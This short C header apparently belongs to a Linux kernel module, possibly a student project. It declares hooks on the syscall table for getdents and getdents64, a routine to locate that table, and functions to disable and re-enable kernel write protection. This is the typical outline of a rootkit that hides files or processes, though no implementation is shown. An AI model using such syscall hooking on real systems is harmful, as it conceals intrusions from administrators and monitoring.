#ifndef _GROUP7_HOOK_H
#define _GROUP7_HOOK_H

#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/syscalls.h>

extern void **sys_call_table;

extern long (*sys_getdents)(unsigned, struct linux_dirent *, unsigned);
extern long (*sys_getdents64)(unsigned, struct linux_dirent64 *, unsigned);

int retrieve_sys_call_table(void);
void init_hooks(void);

void disable_protection(void);
void enable_protection(void);

#endif//_GROUP7_HOOK_H
